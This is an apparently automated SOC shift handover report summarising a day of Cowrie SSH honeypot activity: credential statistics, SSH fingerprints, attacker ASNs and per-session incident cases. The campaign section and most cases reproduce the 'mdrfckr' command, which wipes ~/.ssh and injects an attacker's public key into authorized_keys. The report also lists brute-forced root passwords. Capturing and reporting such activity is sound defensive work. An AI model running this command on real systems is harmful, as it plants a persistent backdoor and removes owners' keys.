# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-05 |
| **Generated At** | 2026-05-05T10:07:20Z |
| **Shift Time** | 10:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **243** |
| Confirmed Threats | **217** |
| False Positives Filtered | **26** (10.7%) |
| Unique Attacker IPs | **43** |
| Countries of Origin | **18** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **225** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **106** |
| Unique Credential Pairs | **78** |
| Unique Usernames | **36** |
| Unique Passwords | **75** |
| Successful Auth Pairs | **13** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 19 |
| `root` | 18 |
| `345gs5662d34` | 8 |
| `user` | 7 |
| `test` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 9 |
| `345gs5662d34` | 8 |
| `123456` | 7 |
| `admin` | 2 |
| `ubuntu12345678` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 9 |
| `345gs5662d34` | `345gs5662d34` | 8 |
| `develop` | `admin` | 2 |
| `ubuntu` | `ubuntu12345678` | 2 |
| `deploy` | `P@ssw0rd` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin@1234567` | `185.158.22.150` | 2026-05-05T06:32:06 |
| `root` | `3245gs5662d34` | `185.158.22.150` | 2026-05-05T06:32:11 |
| `root` | `admin007` | `196.189.124.195` | 2026-05-05T06:49:46 |
| `root` | `3245gs5662d34` | `196.189.124.195` | 2026-05-05T06:49:50 |
| `root` | `madmin123` | `181.233.152.49` | 2026-05-05T06:57:21 |
| `root` | `3245gs5662d34` | `181.233.152.49` | 2026-05-05T06:57:31 |
| `root` | `admin@456` | `196.189.124.195` | 2026-05-05T07:01:27 |
| `root` | `server2012` | `196.189.124.195` | 2026-05-05T07:04:06 |
| `root` | `gw1admin` | `196.189.124.195` | 2026-05-05T07:10:32 |
| `root` | `madmin123` | `196.189.124.195` | 2026-05-05T07:23:28 |
| `root` | `admin2024!@#` | `180.252.199.166` | 2026-05-05T08:57:51 |
| `root` | `3245gs5662d34` | `180.252.199.166` | 2026-05-05T08:57:54 |
| `root` | `test2018` | `180.252.199.166` | 2026-05-05T09:57:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **243** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 115 |
| Paramiko (Python) | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 66 | 4 |
| `f555226df196...` | Mirai/variant | 40 | 1 |
| `87e3d9ffee05...` | Mirai/variant | 8 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 3 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 66 | 4 | libssh-based |
| `f555226df196...` | libssh | 40 | 1 | Mirai/variant |
| `87e3d9ffee05...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `03a80b21afa8...` | libssh | 3 | 3 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.158.22.150`, `180.252.199.166`, `196.189.124.195`, `181.233.152.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **43** |
| Unique ASNs | **31** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | LOW |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS51167` | Contabo GmbH | 3 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 2 | LOW |
| `AS24757` | Ethio Telecom | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS15802` | Emirates Integrated Telecommunications Company PJSC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a17f4f087adf

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-05 06:32 |
| **Last Seen** | 2026-05-05 06:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:32:05` | `cowrie.session.connect` |
| `2026-05-05 06:32:05` | `cowrie.client.version` |
| `2026-05-05 06:32:06` | `cowrie.client.kex` |
| `2026-05-05 06:32:06` | `cowrie.login.success` |
| `2026-05-05 06:32:07` | `cowrie.session.params` |
| `2026-05-05 06:32:07` | `cowrie.command.input` |
| `2026-05-05 06:32:07` | `cowrie.command.failed` |
| `2026-05-05 06:32:07` | `cowrie.log.closed` |
| `2026-05-05 06:32:07` | `cowrie.session.params` |
| `2026-05-05 06:32:07` | `cowrie.command.input` |
| `2026-05-05 06:32:08` | `cowrie.session.file_download` |
| `2026-05-05 06:32:08` | `cowrie.log.closed` |
| `2026-05-05 06:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71291a9a1de8

| Field | Detail |
|---|---|
| **Source IP** | `185.158.22[.]150` |
| **First Seen** | 2026-05-05 06:32 |
| **Last Seen** | 2026-05-05 06:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:32:10` | `cowrie.session.connect` |
| `2026-05-05 06:32:10` | `cowrie.client.version` |
| `2026-05-05 06:32:10` | `cowrie.client.kex` |
| `2026-05-05 06:32:11` | `cowrie.login.success` |
| `2026-05-05 06:32:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.158.22[.]150` to AbuseIPDB if not already reported
- [ ] Block `185.158.22[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfcff2f30d2d

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 06:49 |
| **Last Seen** | 2026-05-05 06:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:49:45` | `cowrie.session.connect` |
| `2026-05-05 06:49:45` | `cowrie.client.version` |
| `2026-05-05 06:49:45` | `cowrie.client.kex` |
| `2026-05-05 06:49:46` | `cowrie.login.success` |
| `2026-05-05 06:49:46` | `cowrie.session.params` |
| `2026-05-05 06:49:46` | `cowrie.command.input` |
| `2026-05-05 06:49:46` | `cowrie.command.failed` |
| `2026-05-05 06:49:47` | `cowrie.log.closed` |
| `2026-05-05 06:49:47` | `cowrie.session.params` |
| `2026-05-05 06:49:47` | `cowrie.command.input` |
| `2026-05-05 06:49:47` | `cowrie.session.file_download` |
| `2026-05-05 06:49:47` | `cowrie.log.closed` |
| `2026-05-05 06:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23bf7fbbe9a0

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 06:49 |
| **Last Seen** | 2026-05-05 06:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:49:49` | `cowrie.session.connect` |
| `2026-05-05 06:49:49` | `cowrie.client.version` |
| `2026-05-05 06:49:49` | `cowrie.client.kex` |
| `2026-05-05 06:49:50` | `cowrie.login.success` |
| `2026-05-05 06:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192f308abe8d

| Field | Detail |
|---|---|
| **Source IP** | `181.233.152[.]49` |
| **First Seen** | 2026-05-05 06:57 |
| **Last Seen** | 2026-05-05 06:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:57:19` | `cowrie.session.connect` |
| `2026-05-05 06:57:19` | `cowrie.client.version` |
| `2026-05-05 06:57:19` | `cowrie.client.kex` |
| `2026-05-05 06:57:21` | `cowrie.login.success` |
| `2026-05-05 06:57:21` | `cowrie.session.params` |
| `2026-05-05 06:57:21` | `cowrie.command.input` |
| `2026-05-05 06:57:21` | `cowrie.command.failed` |
| `2026-05-05 06:57:22` | `cowrie.log.closed` |
| `2026-05-05 06:57:22` | `cowrie.session.params` |
| `2026-05-05 06:57:22` | `cowrie.command.input` |
| `2026-05-05 06:57:23` | `cowrie.session.file_download` |
| `2026-05-05 06:57:23` | `cowrie.log.closed` |
| `2026-05-05 06:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.233.152[.]49` to AbuseIPDB if not already reported
- [ ] Block `181.233.152[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a205911cdc5

| Field | Detail |
|---|---|
| **Source IP** | `181.233.152[.]49` |
| **First Seen** | 2026-05-05 06:57 |
| **Last Seen** | 2026-05-05 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 06:57:29` | `cowrie.session.connect` |
| `2026-05-05 06:57:29` | `cowrie.client.version` |
| `2026-05-05 06:57:29` | `cowrie.client.kex` |
| `2026-05-05 06:57:31` | `cowrie.login.success` |
| `2026-05-05 06:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.233.152[.]49` to AbuseIPDB if not already reported
- [ ] Block `181.233.152[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10eb8ae6fab

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:01 |
| **Last Seen** | 2026-05-05 07:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:01:26` | `cowrie.session.connect` |
| `2026-05-05 07:01:26` | `cowrie.client.version` |
| `2026-05-05 07:01:26` | `cowrie.client.kex` |
| `2026-05-05 07:01:27` | `cowrie.login.success` |
| `2026-05-05 07:01:27` | `cowrie.session.params` |
| `2026-05-05 07:01:27` | `cowrie.command.input` |
| `2026-05-05 07:01:27` | `cowrie.command.failed` |
| `2026-05-05 07:01:27` | `cowrie.log.closed` |
| `2026-05-05 07:01:27` | `cowrie.session.params` |
| `2026-05-05 07:01:27` | `cowrie.command.input` |
| `2026-05-05 07:01:28` | `cowrie.session.file_download` |
| `2026-05-05 07:01:28` | `cowrie.log.closed` |
| `2026-05-05 07:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe30b78c0129

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:01 |
| **Last Seen** | 2026-05-05 07:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:01:30` | `cowrie.session.connect` |
| `2026-05-05 07:01:30` | `cowrie.client.version` |
| `2026-05-05 07:01:30` | `cowrie.client.kex` |
| `2026-05-05 07:01:31` | `cowrie.login.success` |
| `2026-05-05 07:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e23aa824251

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:04 |
| **Last Seen** | 2026-05-05 07:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:04:05` | `cowrie.session.connect` |
| `2026-05-05 07:04:05` | `cowrie.client.version` |
| `2026-05-05 07:04:05` | `cowrie.client.kex` |
| `2026-05-05 07:04:06` | `cowrie.login.success` |
| `2026-05-05 07:04:06` | `cowrie.session.params` |
| `2026-05-05 07:04:06` | `cowrie.command.input` |
| `2026-05-05 07:04:06` | `cowrie.command.failed` |
| `2026-05-05 07:04:06` | `cowrie.log.closed` |
| `2026-05-05 07:04:07` | `cowrie.session.params` |
| `2026-05-05 07:04:07` | `cowrie.command.input` |
| `2026-05-05 07:04:07` | `cowrie.session.file_download` |
| `2026-05-05 07:04:07` | `cowrie.log.closed` |
| `2026-05-05 07:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d2d7920b97

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:04 |
| **Last Seen** | 2026-05-05 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:04:09` | `cowrie.session.connect` |
| `2026-05-05 07:04:09` | `cowrie.client.version` |
| `2026-05-05 07:04:09` | `cowrie.client.kex` |
| `2026-05-05 07:04:10` | `cowrie.login.success` |
| `2026-05-05 07:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e989c1b294dc

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:10 |
| **Last Seen** | 2026-05-05 07:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:10:31` | `cowrie.session.connect` |
| `2026-05-05 07:10:31` | `cowrie.client.version` |
| `2026-05-05 07:10:31` | `cowrie.client.kex` |
| `2026-05-05 07:10:32` | `cowrie.login.success` |
| `2026-05-05 07:10:33` | `cowrie.session.params` |
| `2026-05-05 07:10:33` | `cowrie.command.input` |
| `2026-05-05 07:10:33` | `cowrie.command.failed` |
| `2026-05-05 07:10:33` | `cowrie.log.closed` |
| `2026-05-05 07:10:33` | `cowrie.session.params` |
| `2026-05-05 07:10:33` | `cowrie.command.input` |
| `2026-05-05 07:10:33` | `cowrie.session.file_download` |
| `2026-05-05 07:10:33` | `cowrie.log.closed` |
| `2026-05-05 07:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b593cd8c4607

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:10 |
| **Last Seen** | 2026-05-05 07:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:10:36` | `cowrie.session.connect` |
| `2026-05-05 07:10:36` | `cowrie.client.version` |
| `2026-05-05 07:10:36` | `cowrie.client.kex` |
| `2026-05-05 07:10:37` | `cowrie.login.success` |
| `2026-05-05 07:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.124[.]195` to AbuseIPDB if not already reported
- [ ] Block `196.189.124[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ecca80df8c

| Field | Detail |
|---|---|
| **Source IP** | `196.189.124[.]195` |
| **First Seen** | 2026-05-05 07:23 |
| **Last Seen** | 2026-05-05 07:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 07:23:27` | `cowrie.session.connect` |
| `2026-05-05 07:23:27` | `cowrie.client.version` |
| `2026-05-05 07:23:27` | `cowrie.client.kex` |
| `2026-05-05 07:23:28` | `cowrie.login.success` |
| `2026-05-05 07:23:28` | `cowrie.session.params` |
| `2026-05-05 07:23:28` | `cowrie.command.input` |
| `2026-05-05 07:23:28` | `cowrie.command.failed` |
| `2026-05-05 07:23:28` | `cowrie.log.closed` |
| `2026-05-05 07:23:28` | `cowrie.session.params` |
| `2026-05-05 07:23:28` | `cowrie.command.input` |
| `2026-05-05 07:23:28` | `cowrie.session.file_download` |
| `2026-05-05 07:23:28` | `cowrie.log.closed` |
